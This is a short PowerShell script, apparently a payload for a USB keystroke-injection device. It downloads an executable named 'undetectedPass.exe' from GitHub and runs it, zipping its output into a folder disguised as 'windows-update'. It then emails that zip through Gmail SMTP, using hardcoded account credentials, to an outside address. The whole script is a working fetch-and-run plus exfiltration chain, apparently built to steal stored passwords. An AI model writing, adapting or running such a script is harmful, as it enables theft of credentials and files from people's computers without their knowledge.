$URL = 'https://github.com/RRR3d/ArduinoRubberDucky/raw/main/undetectedPass.exe'
$FilePath = "$env:USERPROFILE\Documents\undetectedPass.exe"
$Command = "$FilePath --zip --dir $env:USERPROFILE\Documents\windows-update"

# Download the file
Invoke-WebRequest -Uri $URL -OutFile $FilePath

# Run the command
Start-Process -FilePath $FilePath -ArgumentList $Command -Wait

$Username = 'xpharoh1@gmail.com'
$Password = 'ThisISnotaRealPassword'
$EmailFrom = 'xpharoh1@gmail.com'
$EmailTo = 'xpharoh@gmail.com'
$Subject = 'URGENT-MSG'
$Body = 'PLEASE CHECK THE ATTACHED FILE'
$SMTPServer = 'smtp.gmail.com'
$SMTPPort = 587
$Attachment = Join-Path $env:USERPROFILE\Documents\windows-update 'windows-update.zip'

$SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
$Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
$AttachmentData = [System.IO.File]::ReadAllBytes($Attachment)
$AttachmentBase64 = [System.Convert]::ToBase64String($AttachmentData)
$AttachmentStream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($AttachmentBase64))
$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'windows-update', 'application/octet-stream')
$Message.Attachments.Add($Attachment)

$SMTPClient.Send($Message)
